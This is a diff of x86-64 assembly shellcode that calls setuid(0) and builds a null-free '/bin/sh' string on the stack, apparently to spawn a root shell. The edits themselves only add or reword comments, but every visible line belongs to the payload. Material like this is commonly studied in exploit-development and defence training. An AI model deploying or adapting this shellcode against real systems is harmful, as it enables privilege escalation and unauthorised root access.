@@ -6,6 +6,7 @@ section .text
 global _start
 
 _start:
+;set-uid root systemcall 
 xor rdi, rdi
 mov al,105
 syscall
@@ -16,9 +17,9 @@ xor rsi, rsi
 xor rdx, rdx
 xor rcx, rcx
 
-;load modded path to register
+;load modded path to a register
 mov dword ecx, 0x68732fff
-;shift to produce a null terminator
+;right shift by 1 byte to produce a null terminator
 shr ecx, 8 
 ;push / b i n to stack
 push 0x6e69622f
